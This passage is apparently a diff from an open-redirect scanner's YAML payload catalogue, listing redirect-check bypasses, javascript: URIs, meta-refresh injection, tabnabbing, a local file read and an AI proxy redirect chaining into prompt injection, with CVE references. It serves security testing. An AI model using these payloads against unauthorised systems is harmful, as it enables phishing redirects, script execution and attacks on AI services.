+    payload: "https://{{TARGET}}＠{{CANARY}}/"
+    description: "Fullwidth @ (U+FF20) — NFKC-normalising parsers accept."
+    tags: ["modern", "unicode", "idn", "2026"]
+    browsers: ["all"]
+    severity_hint: "high"
+    references: ["https://cve.imfht.com/detail/CVE-2026-73420"]
+    interaction: false
+
+  - id: "modern-005"
+    name: "Chrome 120+ backslash normalisation"
+    category: "modern"
+    payload: "https:/\\{{CANARY}}/"
+    description: "Chrome 120+ normalises mixed slashes in authority."
+    tags: ["modern", "browser-specific", "chrome", "2025"]
+    browsers: ["chrome"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "modern-006"
+    name: "Fragment-based SPA redirect"
+    category: "modern"
+    payload: "#https://{{CANARY}}/"
+    description: "Pure fragment — reaches client-side router trusting location.hash."
+    tags: ["modern", "client-side", "spa", "2025"]
+    browsers: ["all"]
+    severity_hint: "medium"
+    interaction: false
+
+  - id: "modern-007"
+    name: "postMessage targetOrigin wildcard"
+    category: "modern"
+    payload: "https://{{CANARY}}/#postMessage"
+    description: "Chains with apps that postMessage redirect to any origin."
+    tags: ["modern", "postmessage", "client-side", "2026"]
+    browsers: ["all"]
+    severity_hint: "medium"
+    interaction: false
+
+  - id: "modern-008"
+    name: "Service worker scope escape"
+    category: "modern"
+    payload: "https://{{CANARY}}/sw.js"
+    description: "Redirect to attacker-hosted service worker script."
+    tags: ["modern", "service-worker", "2026"]
+    browsers: ["chrome", "firefox"]
+    severity_hint: "critical"
+    interaction: false
+
+  - id: "modern-009"
+    name: "Trusted Types blob bypass"
+    category: "modern"
+    payload: "blob:https://{{TARGET}}/uuid-here"
+    description: "Blob URL from same origin — chains into DOM-based redirect."
+    tags: ["modern", "trusted-types", "blob", "2026"]
+    browsers: ["chrome"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "modern-010"
+    name: "AI/LLM proxy redirect"
+    category: "modern"
+    payload: "https://{{CANARY}}/v1/chat"
+    description: "Redirect into AI proxy — chains into SSRF or prompt injection."
+    tags: ["modern", "ai", "llm", "ssrf", "2026"]
+    browsers: ["all"]
+    severity_hint: "critical"
+    interaction: false
+
+  - id: "modern-011"
+    name: "Double-port parser differential (Angular SSR)"
+    category: "modern"
+    payload: "http://{{CANARY}}:80:80/path"
+    description: "WHATWG canParse returns false, other parsers resolve to canary:80 (CVE-2026-xxxx)."
+    tags: ["modern", "parser-differential", "angular", "2026"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "modern-012"
+    name: "Path normalisation + protocol-relative"
+    category: "modern"
+    payload: "/..//{{CANARY}}"
+    description: "Nuxt navigateTo SSR open redirect — normalises to //canary."
+    tags: ["modern", "path-normalisation", "nuxt", "2026"]
+    browsers: ["all"]
+    severity_hint: "high"
+    references: ["https://nvd.nist.gov/vuln/detail/CVE-2026-56326"]
+    interaction: false
+
+  - id: "modern-013"
+    name: "JavaScript URI via navigateTo open option"
+    category: "modern"
+    payload: "javascript:alert(document.domain)"
+    description: "Nuxt navigateTo({ open }) executes javascript: URI in app origin."
+    tags: ["modern", "javascript-uri", "nuxt", "2026"]
+    browsers: ["all"]
+    severity_hint: "critical"
+    references: ["https://nvd.nist.gov/vuln/detail/CVE-2026-56326"]
+    interaction: false
+
+  - id: "modern-014"
+    name: "Protocol-relative via reloadNuxtApp"
+    category: "modern"
+    payload: "//{{CANARY}}/"
+    description: "Nuxt reloadNuxtApp protocol-relative bypass — passes isScriptProtocol check."
+    tags: ["modern", "protocol-relative", "nuxt", "2026"]
+    browsers: ["all"]
+    severity_hint: "high"
+    references: ["https://nvd.nist.gov/vuln/detail/CVE-2026-56326"]
+    interaction: false
+
+  - id: "modern-015"
+    name: "React Router backslash bypass (CVE-2026-53669)"
+    category: "modern"
+    payload: "/\\{{CANARY}}/"
+    description: "React Router <Link> and useNavigate backslash bypass of CVE-2025-68470."
+    tags: ["modern", "react-router", "backslash", "2026"]
+    browsers: ["all"]
+    severity_hint: "high"
+    references: ["https://vulners.com/cve/CVE-2026-53669"]
+    interaction: false
+
+  - id: "modern-016"
+    name: "Grav SSO backslash bypass (CVE-2026-75833)"
+    category: "modern"
+    payload: "/\\{{CANARY}}/"
+    description: "Grav SsoController rejects // but not backslash-prefixed."
+    tags: ["modern", "grav", "backslash", "2026"]
+    browsers: ["all"]
+    severity_hint: "high"
+    references: ["https://vulnerability.circl.lu/vuln/CVE-2026-75833"]
+    interaction: false
+
+  - id: "modern-017"
+    name: "Next.js rewrites hostname suffix bypass (CVE-2026-64645)"
+    category: "modern"
+    payload: "https://{{TARGET}}.evil.com/"
+    description: "Next.js rewrites/redirects hostname suffix bypass."
+    tags: ["modern", "nextjs", "suffix-bypass", "2026"]
+    browsers: ["all"]
+    severity_hint: "high"
+    references: ["https://nvd.nist.gov/vuln/detail/CVE-2026-64645"]
+    interaction: false
+
+  - id: "modern-018"
+    name: "Nitro wildcard extra slash (CVE-2026-44372)"
+    category: "modern"
+    payload: "//{{CANARY}}/path"
+    description: "Nitro wildcard route rule protocol-relative bypass."
+    tags: ["modern", "nitro", "protocol-relative", "2026"]
+    browsers: ["all"]
+    severity_hint: "high"
+    references: ["https://nvd.nist.gov/vuln/detail/CVE-2026-44372"]
+    interaction: false
+
+  # ===========================================================================
+  #  19. LEGACY
+  #      1990s–2000s syntax quirks still occasionally alive.
+  # ===========================================================================
+  - id: "legacy-001"
+    name: "IE 5 javascript: redirect"
+    category: "legacy"
+    payload: "javascript:alert(document.domain)"
+    description: "IE 5 allowed HTTP redirect to javascript: URL — CVE-1999-0891."
+    tags: ["legacy", "ie", "javascript-uri"]
+    browsers: ["legacy"]
+    severity_hint: "high"
+    references: ["https://nvd.nist.gov/vuln/detail/CVE-1999-0891"]
+    interaction: false
+
+  - id: "legacy-002"
+    name: "Netscape local file redirect"
+    category: "legacy"
+    payload: "file:///c:/boot.ini"
+    description: "Netscape 4.x allowed redirect to file:// for local file read."
+    tags: ["legacy", "netscape", "file"]
+    browsers: ["legacy"]
+    severity_hint: "medium"
+    interaction: false
+
+  - id: "legacy-003"
+    name: "Colon-then-slash"
+    category: "legacy"
+    payload: "https:{{TARGET}}@{{CANARY}}/"
+    description: "Missing // after scheme with userinfo."
+    tags: ["legacy", "parser-quirk"]
+    browsers: ["legacy"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "legacy-004"
+    name: "Space before @"
+    category: "legacy"
+    payload: "https://{{TARGET}} @{{CANARY}}/"
+    description: "Space before @ — some parsers URL-encode, some strip."
+    tags: ["legacy", "whitespace"]
+    browsers: ["legacy"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "legacy-005"
+    name: "Tab before @"
+    category: "legacy"
+    payload: "https://{{TARGET}}\t@{{CANARY}}/"
+    description: "Tab before @."
+    tags: ["legacy", "whitespace"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "legacy-006"
+    name: "Null byte truncation"
+    category: "legacy"
+    payload: "https://{{TARGET}}%00.{{CANARY}}/"
+    description: "Null byte truncates hostname validation in C-based parsers."
+    tags: ["legacy", "null-byte"]
+    browsers: ["legacy"]
+    severity_hint: "medium"
+    interaction: false
+
+  - id: "legacy-007"
+    name: "IE 5.0 HTTP redirect javascript"
+    category: "legacy"
+    payload: "javascript:alert(document.domain)"
+    description: "IE 5.0 HTTP redirect to javascript: — window spoofing possible."
+    tags: ["legacy", "ie"]
+    browsers: ["legacy"]
+    severity_hint: "high"
+    references: ["https://seclists.org/bugtraq/1999/Oct/122"]
+    interaction: false
+
+  # ===========================================================================
+  #  20. CLIENT-SIDE (DOM)
+  #      Meta refresh, JavaScript location sinks, window.name.
+  # ===========================================================================
+  - id: "client-001"
+    name: "Meta refresh via HTML injection"
+    category: "client_side"
+    payload: "<meta http-equiv=\"refresh\" content=\"0;url=https://{{CANARY}}/\">"
+    description: "HTML meta refresh — fires when parameter is reflected into HTML."
+    tags: ["client-side", "meta-refresh"]
+    browsers: ["all"]
+    severity_hint: "high"
+    references: ["https://nvd.nist.gov/vuln/detail/CVE-2026-66829"]
+    interaction: false
+
+  - id: "client-002"
+    name: "JavaScript location assignment"
+    category: "client_side"
+    payload: "javascript:window.location='https://{{CANARY}}/'"
+    description: "JS location assignment — fires if reflected into executable context."
+    tags: ["client-side", "javascript-sink"]
+    browsers: ["all"]
+    severity_hint: "critical"
+    interaction: false
+
+  - id: "client-003"
+    name: "Meta refresh with uppercase URL"
+    category: "client_side"
+    payload: "<meta http-equiv=\"refresh\" content=\"0;URL=https://{{CANARY}}/\">"
+    description: "Uppercase URL parameter in meta refresh."
+    tags: ["client-side", "meta-refresh"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "client-004"
+    name: "Meta refresh with single quotes"
+    category: "client_side"
+    payload: "<meta http-equiv='refresh' content='0;url=https://{{CANARY}}/'>"
+    description: "Single-quoted meta refresh."
+    tags: ["client-side", "meta-refresh"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "client-005"
+    name: "Meta refresh with encoded URL"
+    category: "client_side"
+    payload: "<meta http-equiv=\"refresh\" content=\"0;url=https%3A%2F%2F{{CANARY}}%2F\">"
+    description: "URL-encoded target inside meta refresh."
+    tags: ["client-side", "meta-refresh", "encoding"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "client-006"
+    name: "Client-side path traversal + meta refresh"
+    category: "client_side"
+    payload: "/..//{{CANARY}}/#<meta http-equiv=\"refresh\" content=\"0;url=https://{{CANARY}}/\">"
+    description: "Combines client path traversal with meta refresh injection."
+    tags: ["client-side", "path_traversal", "2026"]
+    browsers: ["all"]
+    severity_hint: "high"
+    references: ["https://nvd.nist.gov/vuln/detail/CVE-2026-56326"]
+    interaction: false
+
+  - id: "client-007"
+    name: "window.open noopener bypass"
+    category: "client_side"
+    payload: "javascript:window.opener.location='https://{{CANARY}}/'"
+    description: "Tabnabbing via window.opener navigation."
+    tags: ["client-side", "tabnabbing", "2026"]
+    browsers: ["all"]
+    severity_hint: "high"
+    references: ["https://tessl.io/registry/skills/github/PurpleAILAB/Decepticon/open-redirect"]
+    interaction: false
+
+# =============================================================================
+#  END
+# =============================================================================
